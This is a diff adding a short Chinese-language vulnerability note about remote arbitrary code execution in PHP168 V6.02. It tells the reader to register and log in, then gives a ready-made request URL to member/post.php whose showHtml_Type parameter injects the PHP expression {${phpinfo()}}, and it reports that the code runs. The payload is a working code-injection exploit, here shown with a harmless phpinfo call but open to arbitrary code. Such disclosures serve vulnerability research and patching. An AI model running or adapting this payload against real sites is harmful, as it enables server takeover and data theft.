@@ -1,0 +1,8 @@
+PHP168 V6.02整站系统远程执行任意代码漏洞
+
+
+先注册一个会员,登陆后在地址栏提交:
+
+http://v6.php168.com/member/post.php?only=1&showHtml_Type[bencandy][1]={${phpinfo()}}&aid=1&job=endHTML
+
+可以看到执行了phpinfo().
